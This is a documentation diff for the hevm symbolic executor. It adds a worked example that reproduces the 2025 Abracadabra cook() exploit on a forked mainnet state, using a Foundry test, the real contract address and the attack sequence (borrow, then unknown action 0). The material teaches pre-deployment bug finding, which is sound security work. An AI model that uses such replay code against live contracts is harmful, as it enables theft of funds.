@@ -506,7 +506,10 @@ create a new execution path for each potential value of <code>n</code>, which ca
 large. The same principle applies to recursion, where the depth of the
 recursion may be unbounded or bounded only by a potentially very large number.</p>
 <p>Hence, hevm only explores loops and recursions up to fixed depth <code>k</code>, a
-parameter that can be adjusted from the command line via the <code>--max-iterations k</code> parameter. Whenever the limit is hit, hevm warns of the incomplete exploration:</p>
+parameter that can be adjusted from the command line via the <code>--max-iterations k</code> parameter. This applies to loops whose condition depends on symbolic values;
+loops with a concrete condition run until they end, up to
+<code>--max-concrete-iterations</code>. Whenever the limit is hit, hevm warns of the
+incomplete exploration:</p>
 <pre><code class="language-shell">WARNING: hevm was only able to partially explore the call prefix 0x[...] due to the following issue(s):
   - Max Iterations Reached in contract: 0x[...] pc: [...]
 </code></pre>
@@ -1394,17 +1397,16 @@ Checking 1 function(s) in contract test/Truebit.t.sol:TruebitTest
 more than 5000 ETH.</p>
 <h3 id="finding-the-attack"><a class="header" href="#finding-the-attack">Finding the Attack</a></h3>
 <p>Now let hevm look for a violation of the property, with <code>amount</code> symbolic:</p>
-<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 24190506 --match prove_buy_sell_no_profit --smt-timeout 600
+<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 24190506 --match prove_buy_sell_no_profit
 Checking 1 function(s) in contract test/Truebit.t.sol:TruebitTest
 [RUNNING] prove_buy_sell_no_profit(uint256)
    Counterexample:   [validated]
      calldata: prove_buy_sell_no_profit(243330867036744954592876282)
      result:   Revert: Error("assertion failed: 5586696040365474381874 &gt; 3044085806507062090326")
    [FAIL] prove_buy_sell_no_profit
-   [WARNING] hevm was only able to partially explore the test prove_buy_sell_no_profit due to:
-      1x -&gt; SMT solver says: Result unknown by SMT solver
+   Stopped at the first counterexample, --no-early-abort finds all of them
 </code></pre>
-<p>This took about 35 minutes on 16 cores. hevm found an amount for which buying
+<p>This took about 10 minutes on 16 cores. hevm found an amount for which buying
 costs 3044 ETH but selling returns 5587 ETH. The SMT solver may well return a
 different amount: in our runs it also found 240442509453545333947284168, which
 is 37 away from the attacker's amount and, like it, costs 0 ETH.</p>
@@ -1416,8 +1418,8 @@ touches it. Everything fetched is cached in the user's cache directory, so
 running the test again makes no RPC requests.</li>
 <li><strong>Executed the bytecode symbolically.</strong> <code>amount</code> is a symbolic 256-bit value.
 At every branch whose condition depends on it, such as the checks in
-<code>buyTRU</code> and <code>sellTRU</code>, hevm asks the SMT solver which sides are possible and
-explores each of them, about a hundred paths here.</li>
+<code>buyTRU</code> and <code>sellTRU</code>, hevm explores each side that can be taken, about a
+hundred paths here.</li>
 <li><strong>Asked the solver for a violation.</strong> At the end of each path, hevm asks
 whether some <code>amount</code> makes <code>got &gt; paid</code>. Finding one means solving the
 non-linear, wrapping price arithmetic above, which is why the solver needs
@@ -1426,20 +1428,201 @@ several minutes per query.</li>
 amount it found, against the same fetched state, and the assertion failed
 again. That is what <code>[validated]</code> means, and the <code>result</code> line shows the
 values from that rerun.</li>
+<li><strong>Stopped.</strong> Once it had a counterexample, hevm stopped the remaining paths
+and their solver queries. <code>--no-early-abort</code> explores them all.</li>
 </ul>
-<p>The warning says that one solver query did not finish within the timeout. hevm
-reports that the exploration was partial, but the counterexample it did find is
-real, as the validation shows.</p>
 <h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
 <ul>
-<li>The default <code>--smt-timeout</code> is too short here: the queries that find the
-exploit take 5 to 6 minutes each. If a run ends with only "Result unknown"
-warnings, try a longer timeout.</li>
+<li>The query that finds the exploit takes about 5 minutes, close to the
+default <code>--smt-timeout</code> of 300 seconds. If a run ends with only "Result
+unknown" warnings, try a longer timeout.</li>
 <li>Pin the block with <code>--number</code>. Without it, hevm uses the latest block, where
 the contract's state is different, and the RPC cache is not used.</li>
 <li>To understand where time goes, <code>--progress-log FILE</code> writes a JSON log of
 each solver query and how long it took, and <code>--dump-unsolved DIR</code> saves the
 queries the solver could not answer as SMT2 files.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="worked-example-finding-the-abracadabra-cook-exploit"><a class="header" href="#worked-example-finding-the-abracadabra-cook-exploit">Worked Example: Finding the Abracadabra <code>cook()</code> Exploit</a></h1>
+<p>On 4 October 2025 an attacker borrowed about 1.79 million MIM (about $1.8M)
+from six Abracadabra lending markets ("cauldrons") without putting up any
+collateral. This page shows how a developer could have found that bug with
+hevm before deploying, by checking one property: whatever a user does through
+the cauldron's <code>cook()</code> function, they end up solvent. It also describes how
+we built the demo from the public record of the attack, so the same steps can
+be reused for other incidents.</p>
+<p>As in the <a href="./exploit-tutorial.html">Truebit example</a>, hevm runs on the deployed
+bytecode, with state fetched over RPC from the block before the attack.</p>
+<h2 id="the-bug-1"><a class="header" href="#the-bug-1">The Bug</a></h2>
+<p>A cauldron lends MIM against collateral. Its <code>cook()</code> function runs a list of
+actions in one call, each identified by a number: 5 borrows, 10 adds
+collateral, and so on. Actions that can leave the caller undercollateralized,
+such as borrowing, set a flag, and after the last action <code>cook()</code> checks that
+the caller is solvent if the flag is set:</p>
+<pre><code class="language-solidity">CookStatus memory status;
+for (uint256 i = 0; i &lt; actions.length; i++) {
+    uint8 action = actions[i];
+    ...
+    } else if (action == ACTION_BORROW) {
+        (int256 amount, address to) = abi.decode(datas[i], (int256, address));
+        (value1, value2) = _borrow(to, _num(amount, value1, value2));
+        status.needsSolvencyCheck = true;
+    } else if ...
+    } else {
+        (bytes memory returnData, uint8 returnValues, CookStatus memory returnStatus) =
+            _additionalCookAction(action, status, values[i], datas[i], value1, value2);
+        status = returnStatus;
+        ...
+    }
+}
+
+if (status.needsSolvencyCheck) {
+    (, uint256 _exchangeRate) = updateExchangeRate();
+    require(_isSolvent(msg.sender, _exchangeRate), "Cauldron: user insolvent");
+}
+</code></pre>
+<p>Any action number without a branch of its own goes to <code>_additionalCookAction</code>,
+a hook for derived contracts. In these cauldrons its body is empty, so it
+returns a zeroed <code>CookStatus</code>, and <code>status = returnStatus</code> clears the flag. The
+attacker called <code>cook</code> with actions <code>[5, 0]</code>: borrow, then the unknown action 0,
+which skips the solvency check.</p>
+<h2 id="the-property-1"><a class="header" href="#the-property-1">The Property</a></h2>
+<p>The developers' intent is easy to state without knowing the bug: after any
+call to <code>cook</code>, the caller is solvent. To check it, the test calls <code>cook</code> with
+two actions whose numbers are symbolic, so hevm considers every pair, and with
+a symbolic amount in the data of each action.</p>
+<h2 id="running-it-1"><a class="header" href="#running-it-1">Running It</a></h2>
+<p>You need <a href="https://book.getfoundry.sh/">Foundry</a>, hevm, and the URL of an
+Ethereum mainnet archive node in <code>ETH_RPC_URL</code>.</p>
+<pre><code class="language-plain">forge init --no-git abracadabra
+cd abracadabra
+</code></pre>
+<p>Save as <code>test/Abracadabra.t.sol</code>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Test} from "forge-std/Test.sol";
+
+interface ICauldron {
+    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
+        external payable returns (uint256 value1, uint256 value2);
+    function isSolvent(address user) external view returns (bool);
+    function userBorrowPart(address user) external view returns (uint256);
+    function userCollateralShare(address user) external view returns (uint256);
+}
+
+contract AbracadabraTest is Test {
+    ICauldron constant CAULDRON = ICauldron(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
+
+    function cookTwo(uint8 a0, uint8 a1, int256 amount) internal {
+        uint8[] memory actions = new uint8[](2);
+        actions[0] = a0;
+        actions[1] = a1;
+        uint256[] memory values = new uint256[](2);
+        bytes[] memory datas = new bytes[](2);
+        datas[0] = abi.encode(amount, address(this));
+        datas[1] = abi.encode(amount, address(this));
+        CAULDRON.cook(actions, values, datas);
+    }
+
+    // borrow, then the unknown action 0 clears the solvency check
+    function prove_replay_exploit() public {
+        assertEq(CAULDRON.userCollateralShare(address(this)), 0);
+        cookTwo(5, 0, 1000 ether);
+        assertGt(CAULDRON.userBorrowPart(address(this)), 0);
+        assertFalse(CAULDRON.isSolvent(address(this)));
+    }
+
+    function prove_cook_keeps_solvent(uint8 a0, uint8 a1, int256 amount) public {
+        cookTwo(a0, a1, amount);
+        assertTrue(CAULDRON.isSolvent(address(this)));
+    }
+}
+</code></pre>
+<p>Each action gets the data a borrow expects, an amount and a recipient. Other
+actions decode the same bytes in their own way, or revert.</p>
+<pre><code class="language-plain">forge build --ast
+</code></pre>
+<h3 id="replaying-the-attack-1"><a class="header" href="#replaying-the-attack-1">Replaying the Attack</a></h3>
+<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 23504545 --match prove_replay_exploit
+Checking 1 function(s) in contract test/Abracadabra.t.sol:AbracadabraTest
+[RUNNING] prove_replay_exploit()
+   [PASS] prove_replay_exploit
+</code></pre>
+<p>At block 23504545, the block before the attack, a contract with no collateral
+could borrow 1000 MIM and end up insolvent.</p>
+<h3 id="finding-the-attack-1"><a class="header" href="#finding-the-attack-1">Finding the Attack</a></h3>
+<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 23504545 --match prove_cook_keeps_solvent
+Checking 1 function(s) in contract test/Abracadabra.t.sol:AbracadabraTest
+[RUNNING] prove_cook_keeps_solvent(uint8,uint8,int256)
+   Counterexample:   [validated]
+     calldata: prove_cook_keeps_solvent(5,0,1)
+     result:   Revert: Error("assertion failed")
+   [FAIL] prove_cook_keeps_solvent
+   Stopped at the first counterexample, --no-early-abort finds all of them
+</code></pre>
+<p>This takes under 10 seconds. hevm found the attack: borrow (action 5), then
+action 0. The amount is 1 wei, which shows that the amount does not matter.
+<code>[validated]</code> means that hevm reran the test with these inputs against the same
+state, and the assertion failed again.</p>
+<p>hevm stops at the first counterexample. With <code>--no-early-abort</code> it explores
+every path, which here takes about 17 minutes: a few rounding-heavy solver
+queries need the full <code>--smt-timeout</code>.</p>
+<h2 id="what-hevm-did-1"><a class="header" href="#what-hevm-did-1">What hevm Did</a></h2>
+<ul>
+<li>With both action numbers symbolic, every <code>if</code> in <code>cook()</code> is a branch, and
+hevm explores each sequence of two actions it can take, several hundred
+paths.</li>
+<li>For each branch it asks the SMT solver which sides are possible. Some
+actions convert amounts between shares and debt with several roundings,
+which the solver cannot always decide quickly. Those queries are cut off
+after <code>--smt-branch-timeout</code> (20 seconds by default) and hevm explores both
+sides.</li>
+<li>Paths that reach the solvency check call the cauldron's oracle, which runs
+a loop of up to 255 steps over fetched state. Its condition is concrete, so
+hevm runs it to the end.</li>
+<li>At the end of each path, hevm asks the solver whether the caller can be
+insolvent, and finds that after <code>[5, 0]</code> they can. It then stops the other
+paths and their solver queries.</li>
+</ul>
+<h2 id="how-we-built-this-demo"><a class="header" href="#how-we-built-this-demo">How We Built This Demo</a></h2>
+<ol>
+<li><strong>Find the attack.</strong> Public analyses gave the attack transaction,
+<code>0x842aae91c89a9e5043e64af34f53dc66daf0f033ad8afbf35ef0c93f99a9e5e6</code>.
+<code>eth_getTransactionByHash</code> gave its block, 23504546, and showed that the
+attack ran in a contract's constructor. The logs from
+<code>eth_getTransactionReceipt</code> named the six cauldrons and showed a borrow
+from each. Free RPC plans often lack <code>debug_traceTransaction</code>, but the
+logs are usually enough.</li>
+<li><strong>Find the code.</strong> <code>eth_getCode</code> on a cauldron returned 45 bytes: an
+EIP-1167 minimal proxy that delegates to a master contract,
+<code>0x5e70f7acb8ec0231c00220d11c74dc2b23187103</code>. Its verified source, from
+<a href="https://sourcify.dev/">Sourcify</a>, contains the <code>cook()</code> function above.
+hevm itself needs only the bytecode, but the source tells us what to check.</li>
+<li><strong>Write the property.</strong> Rather than replaying the attacker's calls, state
+what must always hold and leave the attacker's choices symbolic: here, the
+action numbers and the amount.</li>
+<li><strong>Replay first.</strong> A concrete test of the known attack checks the fork setup
+(block, addresses, interfaces) before the long symbolic run.</li>
+<li><strong>Read the warnings.</strong> Our first symbolic runs found the attack but took
+over 40 minutes, and reported paths cut short at "Max iterations reached"
+in two contracts we did not call directly. The progress log
+(<code>--progress-log FILE</code>) showed the time going into branch queries that hit
+the 300 second solver timeout. The bytecode of the contracts with the cut
+paths showed a loop of up to 255 steps, the oracle's pricing loop. Both
+led to changes in hevm: branch queries got their own, shorter timeout, and
+loops with concrete conditions their own, higher limit. The counterexample
+then came within a minute, but the run went on for 17 more, so hevm now
+stops at the first counterexample by default.</li>
+</ol>
+<h2 id="tips-1"><a class="header" href="#tips-1">Tips</a></h2>
+<ul>
+<li>Keep the number of symbolic actions small. Each one multiplies the paths by
+the number of actions <code>cook()</code> knows; two are enough for this bug.</li>
+<li>If a run is slow, <code>--progress-log FILE</code> shows where the solver time goes,
+and <code>--dump-unsolved DIR</code> saves the queries it could not answer.</li>
+<li>"Max iterations reached" in a contract you did not expect to loop is worth
+a look: <code>--max-iterations</code> bounds loops with symbolic conditions, and
+<code>--max-concrete-iterations</code> the others.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="hevm-test"><a class="header" href="#hevm-test"><code>hevm test</code></a></h1>
 <pre><code class="language-plain">Usage: hevm test [--root STRING] [--project-type PROJECTTYPE] [--rpc TEXT]
@@ -1807,12 +1990,30 @@ execution of the contract. This is currently neccessary to fully explore
 certain contracts. This is because value transfer is usually done via a <code>CALL</code>,
 which can be reentrant. By promising no reentrancy, the system can assume that
 no reentrancy will occur and can explore the contract more fully.</p>
-<h2 id="timeout-for-smt-queries---smttimeout"><a class="header" href="#timeout-for-smt-queries---smttimeout">Timeout for SMT queries, <code>--smttimeout</code></a></h2>
+<h2 id="timeout-for-smt-queries---smt-timeout---smt-branch-timeout"><a class="header" href="#timeout-for-smt-queries---smt-timeout---smt-branch-timeout">Timeout for SMT queries, <code>--smt-timeout</code>, <code>--smt-branch-timeout</code></a></h2>
 <p>Some queries take too long. With a timeout, we ensure that hevm eventually
 terminates. However, endstates where the timeout was reached are considered
 inditerminate, and will lead to a <code>WARNING</code> in the output. It is worthwhile
 trying to switch to a different SMT solver such as bitwuzla, or increasing the
-timeout if this happens.</p>
+timeout if this happens. The default is 300 seconds.</p>
+<p>The queries that decide which side of a branch can be taken have their own,
+shorter timeout, <code>--smt-branch-timeout</code>, 20 seconds by default and at most
+<code>--smt-timeout</code>. When the solver cannot decide a branch, hevm explores both
+sides, so a timeout there costs no counterexamples, only time spent on paths
+that may be impossible.</p>
+<h2 id="stopping-at-the-first-counterexample---no-early-abort"><a class="header" href="#stopping-at-the-first-counterexample---no-early-abort">Stopping at the First Counterexample, <code>--no-early-abort</code></a></h2>
+<p>By default, hevm stops exploring once it finds a counterexample: the paths
+still being explored stop, and their solver queries are cancelled. With
+<code>--no-early-abort</code> it explores every path, to report all counterexamples and
+every path it could not explore fully.</p>
+<h2 id="loop-iteration-limits---max-iterations---max-concrete-iterations"><a class="header" href="#loop-iteration-limits---max-iterations---max-concrete-iterations">Loop Iteration Limits, <code>--max-iterations</code>, <code>--max-concrete-iterations</code></a></h2>
+<p>hevm explores a loop whose condition depends on symbolic values at most
+<code>--max-iterations</code> times, 5 by default, and warns that the exploration was
+partial when it stops there. Loops whose condition is concrete, such as a
+loop over state fetched with <code>--rpc</code>, run until they end, up to
+<code>--max-concrete-iterations</code>, 10000 by default. That limit only exists because
+hevm does not track gas symbolically, so a loop that never ends would
+otherwise never stop. Set either to -1 for no limit.</p>
 <h2 id="loop-iteration-limit---ask-smt-iterations"><a class="header" href="#loop-iteration-limit---ask-smt-iterations">Loop Iteration Limit, <code>--ask-smt-iterations</code></a></h2>
 <p>Loops in the code cause a challenge to symbolic execution framework. In order
 to not run indefinitely, hevm will only explore a certain number of iterations
